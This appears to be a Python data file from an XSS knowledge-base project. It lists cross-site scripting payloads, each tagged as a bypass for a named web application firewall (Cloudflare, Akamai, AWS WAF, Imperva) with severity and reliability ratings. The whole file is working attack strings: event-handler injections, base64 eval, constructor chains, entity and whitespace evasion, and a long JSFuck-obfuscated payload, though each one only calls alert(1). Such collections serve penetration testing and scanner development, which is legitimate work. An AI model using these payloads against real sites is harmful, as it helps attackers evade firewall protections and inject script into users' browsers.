#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Complete WAF Bypass Payloads Collection - Part 1
Cloudflare, Akamai, AWS WAF, and Imperva/Incapsula bypasses.
"""

from ..models import PayloadEntry


BRS_KB_WAF_COMPLETE_PAYLOADS_PART1 = {
    # ============================================================
    # CLOUDFLARE ADVANCED BYPASSES
    # ============================================================
    "cf-bypass-svg-onload-1": PayloadEntry(
        payload="<svg/onload=alert`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass - SVG backtick",
        tags=["waf", "cloudflare", "bypass"],
        bypasses=["cloudflare"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "cf-bypass-img-onerror-1": PayloadEntry(
        payload='<img src=x onerror="alert`1`">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass - img backtick",
        tags=["waf", "cloudflare", "bypass"],
        bypasses=["cloudflare"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "cf-bypass-body-onpageshow": PayloadEntry(
        payload='<body onpageshow="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass - onpageshow event",
        tags=["waf", "cloudflare", "bypass"],
        bypasses=["cloudflare"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "cf-bypass-details-ontoggle": PayloadEntry(
        payload='<details open ontoggle="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass - ontoggle event",
        tags=["waf", "cloudflare", "bypass"],
        bypasses=["cloudflare"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "cf-bypass-svg-animate": PayloadEntry(
        payload='<svg><animate onbegin="alert(1)" attributeName="x">',
        contexts=["html_content", "svg_xss"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass - SVG animate",
        tags=["waf", "cloudflare", "bypass", "svg"],
        bypasses=["cloudflare"],
        waf_evasion=True,
        browser_support=["chrome", "firefox"],
        reliability="high",
    ),
    "cf-bypass-math-1": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        contexts=["html_content", "mathml"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass - MathML mutation",
        tags=["waf", "cloudflare", "bypass", "mathml"],
        bypasses=["cloudflare"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    # ============================================================
    # AKAMAI ADVANCED BYPASSES
    # ============================================================
    "akamai-bypass-svg-1": PayloadEntry(
        payload="<svg/onload=alert(String.fromCharCode(49))>",
        contexts=["html_content", "svg_xss"],
        severity="high",
        cvss_score=7.5,
        description="Akamai bypass - fromCharCode",
        tags=["waf", "akamai", "bypass"],
        bypasses=["akamai"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "akamai-bypass-concat-1": PayloadEntry(
        payload="<img src=x onerror=alert(['x']+'ss')>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Akamai bypass - array concat",
        tags=["waf", "akamai", "bypass"],
        bypasses=["akamai"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "akamai-bypass-eval-1": PayloadEntry(
        payload='<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Akamai bypass - base64 eval",
        tags=["waf", "akamai", "bypass", "base64"],
        bypasses=["akamai"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "akamai-bypass-constructor-1": PayloadEntry(
        payload="<img src=x onerror=[].constructor.constructor('alert(1)')()>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Akamai bypass - constructor chain",
        tags=["waf", "akamai", "bypass"],
        bypasses=["akamai"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # AWS WAF ADVANCED BYPASSES
    # ============================================================
    "aws-waf-bypass-unicode-1": PayloadEntry(
        payload='<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="AWS WAF bypass - HTML entities",
        tags=["waf", "aws", "bypass", "entity"],
        bypasses=["aws_waf"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "aws-waf-bypass-newline-1": PayloadEntry(
        payload="<img src=x onerror\n=\nalert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="AWS WAF bypass - newline in attribute",
        tags=["waf", "aws", "bypass", "newline"],
        bypasses=["aws_waf"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "aws-waf-bypass-tab-1": PayloadEntry(
        payload="<img\tsrc=x\tonerror\t=\talert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="AWS WAF bypass - tabs in tag",
        tags=["waf", "aws", "bypass", "whitespace"],
        bypasses=["aws_waf"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # IMPERVA/INCAPSULA BYPASSES
    # ============================================================
    "imperva-bypass-svg-1": PayloadEntry(
        payload="<svg><script>alert&lpar;1&rpar;</script></svg>",
        contexts=["html_content", "svg_xss"],
        severity="high",
        cvss_score=7.5,
        description="Imperva bypass - entity in script",
        tags=["waf", "imperva", "bypass", "entity"],
        bypasses=["imperva"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "imperva-bypass-img-1": PayloadEntry(
        payload='<img src=x onerror="top[`al`+`ert`](1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Imperva bypass - string concat",
        tags=["waf", "imperva", "bypass", "concat"],
        bypasses=["imperva"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "imperva-bypass-jsfuck-1": PayloadEntry(
        payload="<img src=x onerror=[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Imperva bypass - JSFuck obfuscation",
        tags=["waf", "imperva", "bypass", "jsfuck"],
        bypasses=["imperva"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
}
